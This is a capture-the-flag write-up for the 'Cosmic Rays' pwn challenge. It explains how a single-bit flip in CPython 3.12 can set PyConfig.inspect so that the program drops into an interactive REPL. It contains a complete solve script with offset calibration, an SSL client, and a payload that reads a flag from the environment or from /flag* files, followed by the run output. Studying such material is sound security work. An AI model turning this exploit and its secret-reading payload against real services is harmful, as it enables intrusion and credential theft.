---
title: Cosmic Rays
date: 2026-06-28
tags:
- pwn
- MntcrlCTF-2026
---

- **Challenge:** Cosmic Rays
- **Category:** Pwn
- **Flag:** `mntcrl{idkgg1a_2d22c46195e2495f}`

---

## My initial read / first impressions

We are given a tiny Python pwn challenge.

The files are extremely small:

* `chall.py`
* `Dockerfile`
* `compose.yml`

The actual challenge code is basically nothing:

```python
import ctypes
print(f"{hex(id(0)) = }")
b = ctypes.c_ubyte.from_address(int(input("> "), 16))
b.value ^= 1
```

So the program leaks:

```python
hex(id(0))
```

Then it asks us for an address, treats that address as a single byte, and flips the lowest bit:

```python
b.value ^= 1
```

That means we get exactly one bit flip at an arbitrary address.

At first, this looks way too small to be useful. We do not get normal arbitrary write, we do not get a stack overflow, and we do not get to run Python code directly.

But the important detail is that the process itself is Python, and the leak is an address inside CPython's runtime.

So this challenge is really about abusing CPython internals.

## The setup

The Dockerfile is:

```dockerfile
FROM python:3.12-alpine

RUN apk add --no-cache socat

WORKDIR /app
COPY chall.py .

EXPOSE 1337
CMD ["socat", "TCP-LISTEN:1337,reuseaddr,fork", "EXEC:python3 /app/chall.py,stderr,pty,setsid,ctty"]
```

The two important parts are:

```dockerfile
FROM python:3.12-alpine
```

and:

```dockerfile
EXEC:python3 /app/chall.py,stderr,pty,setsid,ctty
```

The first part tells us the exact Python environment is CPython 3.12 on Alpine.

The second part is also important because `socat` runs Python with a PTY. That means from Python's point of view, stdin is interactive.

That matters later.

## Understanding the primitive

The challenge leaks:

```python
hex(id(0))
```

In CPython, small integers are not normal heap allocations every time. They are preallocated static objects inside the CPython runtime.

So `id(0)` gives us the address of the static `0` object.

In CPython 3.12, these small integers live in `_PyRuntime.static_objects.singletons.small_ints`.

The range includes `-5` through `256`, so integer `0` is at index `5`.

So the leak gives us a stable anchor inside `_PyRuntime`.

Then this line gives us the actual bug:

```python
b = ctypes.c_ubyte.from_address(int(input("> "), 16))
b.value ^= 1
```

That lets us flip the lowest bit of one byte at any address.

So the plan is:

1. Use `id(0)` as a base leak.
2. Calculate the offset from `id(0)` to some useful CPython runtime field.
3. Send that target address.
4. Flip one bit.
5. Make Python do something useful before the process exits.

## The target: PyConfig.inspect

The useful target is CPython's interactive inspect flag.

When Python runs a file, there is a config field called:

```c
PyConfig.inspect
```

This is what gets set when Python is run with `-i`.

For example:

```bash
python3 -i script.py
```

runs the script and then drops into an interactive Python shell.

That is perfect for this challenge.

If we can flip `PyConfig.inspect` from `0` to `1`, then after `chall.py` finishes, CPython will drop us into a REPL.

And because the service is running with a PTY, stdin counts as interactive, so the REPL actually works.

Then we can just send a second line of Python code like:

```python
import os; print(os.environ["FLAG"])
```

The flag is in the environment, so that gives us the win.

## The important detail

At first, it is tempting to look for an exported global like:

```c
Py_InspectFlag
```

But for this challenge, the reliable target is not just that old global flag.

The relevant path checks the live config:

```c
config->inspect
```

So the real target is:

```c
_PyRuntime._main_interpreter.config.inspect
```

That is the field we want to flip from `0` to `1`.

Since the challenge only flips one bit, this is perfect. The first byte of the integer is `0`, and flipping bit 0 makes it `1`.

## Calculating the offset

The annoying part is that the offset depends on the exact CPython build.

Since the Dockerfile uses:

```dockerfile
FROM python:3.12-alpine
```

I used Docker to compile a tiny C helper inside the same image and calculate the offset properly.

The helper calculates:

```text
address of _PyRuntime._main_interpreter.config.inspect
-
address of _PyRuntime.static_objects.singletons.small_ints[5]
```

That second address is the leaked `id(0)`.

The calibration output was:

```text
small0=0xc88
inspect=0x12d4c
offset=0x120c4
```

So if the remote leaks:

```text
0x7fcd39567ec8
```

then the target address is:

```text
0x7fcd39567ec8 + 0x120c4 = 0x7fcd39579f8c
```

Sending that address flips `PyConfig.inspect`.

## Exploit flow

The final exploit does this:

1. Run a Docker calibration step using `python:3.12-alpine`.
2. Compute the correct offset to `PyConfig.inspect`.
3. Connect to the remote SSL service.
4. Read the leaked `id(0)`.
5. Add the offset.
6. Send the target address.
7. Immediately send Python code for the REPL.
8. Extract the flag.

The reason we can send the Python code immediately is because the first line is consumed by:

```python
input("> ")
```

Then after the script exits, CPython enters interactive mode, and the second line is consumed by the REPL.

## Solution Script

Here is the final solve script:

```python
import argparse
import os
import re
import select
import socket
import ssl
import subprocess
import sys
import time

LEAK_RE = re.compile(rb"0x[0-9a-fA-F]+")
FLAG_RE = re.compile(rb"mntcrl\{[^}\r\n]+\}")

PAYLOAD = (
    b"import os,glob;"
    b"g=glob.glob('/flag*');"
    b"print(os.environ.get('FLAG') or (open(g[0]).read() if g else 'NOFLAG'))\n"
)

CALC_C = r'''
#define Py_BUILD_CORE
#include <Python.h>
#include <stddef.h>
#include <stdio.h>
#include "internal/pycore_runtime.h"
#include "internal/pycore_interp.h"
#include "internal/pycore_global_objects.h"

int main(void) {
    size_t small0 =
        offsetof(_PyRuntimeState, static_objects)
        + offsetof(struct _Py_static_objects, singletons.small_ints)
        + 5 * sizeof(PyLongObject);

    size_t inspect =
        offsetof(_PyRuntimeState, _main_interpreter)
        + offsetof(PyInterpreterState, config)
        + offsetof(PyConfig, inspect);

    printf("small0=%#zx\n", small0);
    printf("inspect=%#zx\n", inspect);
    printf("offset=%#zx\n", inspect - small0);
    return 0;
}
'''


def parse_int(x):
    return int(x, 0)


def docker_calibrate(image):
    cmd = [
        "docker", "run", "--rm", "-i", image, "sh", "-lc",
        "apk add --no-cache gcc musl-dev >/dev/null && "
        "cat > /tmp/calc.c && "
        "gcc -DPy_BUILD_CORE "
        "-I/usr/local/include/python3.12 "
        "-I/usr/local/include/python3.12/internal "
        "/tmp/calc.c -o /tmp/calc && "
        "/tmp/calc"
    ]

    print(f"[*] calibrating offset using Docker image: {image}", file=sys.stderr)
    p = subprocess.run(cmd, input=CALC_C.encode(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if p.returncode != 0:
        print(p.stderr.decode(errors="replace"), file=sys.stderr)
        raise SystemExit("[-] Docker calibration failed")

    out = p.stdout.decode()
    print(out, file=sys.stderr)

    m = re.search(r"offset=(0x[0-9a-fA-F]+)", out)
    if not m:
        raise SystemExit("[-] could not parse offset")

    return int(m.group(1), 16)


def ssl_connect(host, port, timeout):
    raw = socket.create_connection((host, port), timeout=timeout)
    ctx = ssl._create_unverified_context()
    s = ctx.wrap_socket(raw, server_hostname=host)
    s.setblocking(False)
    return s


def nb_recv(s, seconds, stop_re=None):
    deadline = time.monotonic() + seconds
    out = b""

    while time.monotonic() < deadline:
        try:
            if not s.pending():
                left = max(0.0, deadline - time.monotonic())
                r, _, _ = select.select([s], [], [], min(0.05, left))
                if not r:
                    continue

            chunk = s.recv(4096)
            if not chunk:
                break

            out += chunk

            if stop_re and stop_re.search(out):
                break

        except (ssl.SSLWantReadError, ssl.SSLWantWriteError, BlockingIOError):
            continue
        except OSError:
            break

    return out


def nb_sendall(s, data, timeout):
    deadline = time.monotonic() + timeout
    sent = 0

    while sent < len(data) and time.monotonic() < deadline:
        try:
            n = s.send(data[sent:])
            if n <= 0:
                return False
            sent += n
        except (ssl.SSLWantReadError, ssl.SSLWantWriteError, BlockingIOError):
            left = max(0.0, deadline - time.monotonic())
            select.select([], [s], [], min(0.05, left))
        except OSError:
            return False

    return sent == len(data)


def attempt(host, port, offset, timeout, verbose=False):
    s = ssl_connect(host, port, timeout)

    with s:
        banner = nb_recv(s, timeout, LEAK_RE)
        m = LEAK_RE.search(banner)

        if not m:
            print(f"[-] no leak; banner={banner!r}", file=sys.stderr)
            return None

        leak = int(m.group(0), 16)
        target = leak + offset

        print(f"[*] leak={leak:#x}", file=sys.stderr)
        print(f"[*] offset={offset:#x}", file=sys.stderr)
        print(f"[*] target={target:#x}", file=sys.stderr)

        data = f"{target:#x}\n".encode() + PAYLOAD
        nb_sendall(s, data, timeout)

        out = banner + nb_recv(s, timeout + 4.0)

    if verbose:
        print(out.decode(errors="replace"), file=sys.stderr)

    m = FLAG_RE.search(out)
    if m:
        return m.group(0).decode()

    print(f"[-] no flag; tail={out[-500:]!r}", file=sys.stderr)
    return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    parser.add_argument("--offset", type=parse_int)
    parser.add_argument("--image", default="python:3.12-alpine")
    parser.add_argument("--timeout", type=float, default=4.0)
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    offset = args.offset

    if offset is None:
        offset = docker_calibrate(args.image)

    flag = attempt(args.host, args.port, offset, args.timeout, args.verbose)

    if flag:
        print(flag)
    else:
        print("[-] failed")
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
```

Running it:

```bash
python solve.py cosmic-rays-c22312a2d033.c.mntcrl.it 443 -v
```

Output:

```text
[*] calibrating offset using Docker image: python:3.12-alpine
small0=0xc88
inspect=0x12d4c
offset=0x120c4

[*] leak=0x7fcd39567ec8
[*] offset=0x120c4
[*] target=0x7fcd39579f8c
hex(id(0)) = '0x7fcd39567ec8'
> 0x7fcd39579f8c
import os,glob;g=glob.glob('/flag*');print(os.environ.get('FLAG') or (open(g[0]).read() if g else 'NOFLAG'))
mntcrl{idkgg1a_2d22c46195e2495f}
>>> 
mntcrl{idkgg1a_2d22c46195e2495f}
```

And that gives the flag.
